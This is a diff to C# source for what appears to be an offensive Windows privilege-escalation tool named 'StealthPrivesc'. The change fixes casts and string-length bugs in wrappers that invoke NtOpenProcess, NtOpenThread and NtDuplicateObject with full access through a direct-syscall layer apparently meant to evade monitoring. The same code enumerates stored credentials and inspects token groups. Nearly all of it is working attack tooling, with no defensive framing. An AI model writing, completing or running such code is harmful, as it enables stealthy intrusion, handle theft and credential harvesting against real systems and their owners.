@@ -7,6 +7,7 @@ namespace StealthPrivesc {
     // Loud-API wrappers over NativeSyscall. Every failure surfaces as a typed exception.
     public static class NativeCalls {
         [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);
+        [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
         [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
         [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
         [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr handle);
@@ -22,25 +23,23 @@ namespace StealthPrivesc {
         [DllImport("advapi32.dll", SetLastError = true)] static extern bool GetTokenInformation(IntPtr token, uint cls, IntPtr buffer, uint len, out uint needed);
         [DllImport("advapi32.dll", SetLastError = true)] static extern bool CheckTokenMembership(IntPtr token, IntPtr sid, IntPtr group, out bool member);
         [DllImport("kernel32.dll")] static extern IntPtr LocalFree(IntPtr pointer);
-        internal static IntPtr ToPtr(ulong value) { return new IntPtr(value); }
+        internal static IntPtr ToPtr(ulong value) { return new IntPtr(unchecked((long)value)); }
         internal static ulong FromPtr(IntPtr value) { return unchecked((ulong)value.ToInt64()); }
         internal static IntPtr OpenProcess(uint pid, uint access) {
             IntPtr memory = NativeSyscall.Attrs;
-            IntPtr name = Marshal.StringToHGlobalUni("\\\\" + pid.ToString(System.Globalization.CultureInfo.InvariantCulture));
+            string target = "\\\\" + pid.ToString(System.Globalization.CultureInfo.InvariantCulture);
+            IntPtr name = Marshal.StringToHGlobalUni(target);
             IntPtr text = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(NativeObjects.UnicodeString)));
-            var unicode = new NativeObjects.UnicodeString { Length = (ushort)((pid.ToString(System.Globalization.CultureInfo.InvariantCulture).Length) * 2), MaximumLength = (ushort)((pid.ToString(System.Globalization.CultureInfo.InvariantCulture).Length + 1) * 2), Buffer = name };
+            var unicode = new NativeObjects.UnicodeString { Length = (ushort)(target.Length * 2), MaximumLength = (ushort)((target.Length + 1) * 2), Buffer = name };
             Marshal.StructureToPtr(unicode, text, false);
             Marshal.WriteIntPtr(memory, 16, text);
             uint number = 0;
             int status;
             try {
-                number = NativeSyscall.Number("NtOpenProcess", ref number);
-                IntPtr slot = Marshal.AllocHGlobal(8);
-                try {
-                    status = NativeSyscall.Call((uint)number, 0x1FFFFFUL, FromPtr(text), 0, 0, 0, 0, 0);
-                    if (status != 0) { throw new Win32Exception((int)unchecked((uint)status)); }
-                    return new IntPtr(Marshal.ReadInt64(memory + 8));
-                } finally { Marshal.FreeHGlobal(slot); }
+                number = (uint)NativeSyscall.Number("NtOpenProcess", ref number);
+                status = NativeSyscall.Call((uint)number, 0x1FFFFFUL, FromPtr(text), 0, 0, 0, 0, 0);
+                if (status != 0) { throw new Win32Exception((int)unchecked((uint)status)); }
+                return new IntPtr(Marshal.ReadInt64(memory + 8));
             } catch (Win32Exception) {
                 throw;
             } catch (Exception) {
@@ -60,7 +59,7 @@ namespace StealthPrivesc {
             Marshal.WriteIntPtr(memory, 16, unistr);
             uint number = 0;
             try {
-                number = NativeSyscall.Number("NtOpenThread", ref number);
+                number = (uint)NativeSyscall.Number("NtOpenThread", ref number);
                 int status = NativeSyscall.Call((uint)number, 0x1FFFFFUL, FromPtr(unistr), 0, 0, 0, 0, 0);
                 if (status != 0) { throw new Win32Exception((int)unchecked((uint)status)); }
                 return new IntPtr(Marshal.ReadInt64(memory + 8));
@@ -75,7 +74,7 @@ namespace StealthPrivesc {
             uint number = 0;
             IntPtr slot = Marshal.AllocHGlobal(8);
             try {
-                number = NativeSyscall.Number("NtDuplicateObject", ref number);
+                number = (uint)NativeSyscall.Number("NtDuplicateObject", ref number);
                 int status = NativeSyscall.Call((uint)number, FromPtr(source), FromPtr(handle), FromPtr(target), 0, access, (ulong)(inherit ? 1 : 0), FromPtr(slot));
                 if (status != 0) { throw new Win32Exception((int)unchecked((uint)status)); }
                 return new IntPtr(Marshal.ReadInt64(slot));
@@ -85,7 +84,7 @@ namespace StealthPrivesc {
             uint number = 0;
             IntPtr slot = Marshal.AllocHGlobal(4);
             try {
-                number = NativeSyscall.Number("NtQuerySystemInformation", ref number);
+                number = (uint)NativeSyscall.Number("NtQuerySystemInformation", ref number);
                 int status = NativeSyscall.Call((uint)number, (uint)kind, FromPtr(buffer), size, FromPtr(slot), 0, 0, 0);
                 needed = Marshal.ReadInt32(slot);
                 return unchecked((uint)status);
@@ -95,7 +94,7 @@ namespace StealthPrivesc {
             uint number = 0;
             IntPtr slot = Marshal.AllocHGlobal(4);
             try {
-                number = NativeSyscall.Number("NtQueryObject", ref number);
+                number = (uint)NativeSyscall.Number("NtQueryObject", ref number);
                 int status = NativeSyscall.Call((uint)number, FromPtr(handle), (uint)kind, FromPtr(buffer), size, FromPtr(slot), 0, 0);
                 needed = Marshal.ReadInt32(slot);
                 return unchecked((uint)status);
@@ -110,7 +109,7 @@ namespace StealthPrivesc {
                 if (error != 1168) { throw new Win32Exception(error); }
                 return;
             }
-            count = count32; buffer = pointer;
+            count = unchecked((int)count32); buffer = pointer;
         }
         internal static void CredEnumFree(IntPtr buffer) { if (buffer != IntPtr.Zero) { CredFree(buffer); } }
         internal static IntPtr ProcessToken(IntPtr process, uint access) {
@@ -132,11 +131,11 @@ namespace StealthPrivesc {
             IntPtr slot = Marshal.AllocHGlobal(64);
             try {
                 uint needed;
-                int status = (int)GetTokenInformation(token, 2, IntPtr.Zero, 0, out needed);
+                GetTokenInformation(token, 2, IntPtr.Zero, 0, out needed);
                 if (needed == 0 || needed > 0x1000) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
                 if (!GetTokenInformation(token, 2, slot, needed, out needed)) { throw new Win32Exception(Marshal.GetLastWin32Error()); }
                 int count = Marshal.ReadInt32(slot, 4);
-                if (count < 0 || count > 0x100) { throw new Win32Exception(0xC000000D); }
+                if (count < 0 || count > 0x100) { throw new Win32Exception(unchecked((int)0xC000000D)); }
                 IntPtr entries = IntPtr.Add(slot, IntPtr.Size);
                 for (int i = 0; i < count; i++) {
                     IntPtr entry = IntPtr.Add(entries, (i * 16));
